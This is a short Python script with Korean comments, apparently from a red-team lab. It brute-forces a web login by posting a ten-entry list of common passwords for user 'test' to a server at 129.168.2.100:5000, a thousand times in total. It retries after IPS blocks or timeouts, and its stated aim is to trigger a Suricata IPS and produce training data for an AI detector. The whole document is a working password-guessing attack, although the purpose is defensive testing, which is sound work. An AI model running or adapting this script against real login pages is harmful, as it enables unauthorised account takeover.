import requests
import time
from datetime import datetime

# 🎯 타겟 정보 세팅 (Tailscale 주소로 수정 완료!)
target_url = "http://129.168.2.100:5000/"
target_user = "test"

# 😈 해커들의 단골 비밀번호 사전 (Top 10)
password_dictionary = [
    "1111", "1234", "admin", "password", "qwer", 
    "asdf", "zxcv", "0000", "9999", "guest"
]

print("🔥 [Red Team] 수리카타 IPS 타격 및 AI 학습용 데이터 생성을 시작합니다...")
print(f"   - 타겟 주소: {target_url}\n")

# 총 100세트 (1,000번의 공격) 실행
for cycle in range(1, 101): 
    for attempt_num, test_pw in enumerate(password_dictionary, 1):
        payload = {"id": target_user, "pw": test_pw}
        
        try:
            # 타임아웃을 3초로 짧게 주어 서버가 기절하기 전에 빠져나옴
            response = requests.post(target_url, data=payload, timeout=3)
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{now}] 🔫 공격발송 | user={target_user} | pw={test_pw:<8} | 서버응답={response.status_code}")
            
        except requests.exceptions.RequestException:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{now}] 🛡️ IPS 차단/서버 타임아웃 감지! 3초 대기 후 우회 재시도...")
            time.sleep(3)
            continue
            
        # 💡 핵심: 수리카타가 탐지하기 딱 좋은 속도 (1초에 10번 타격)
        time.sleep(0.1)
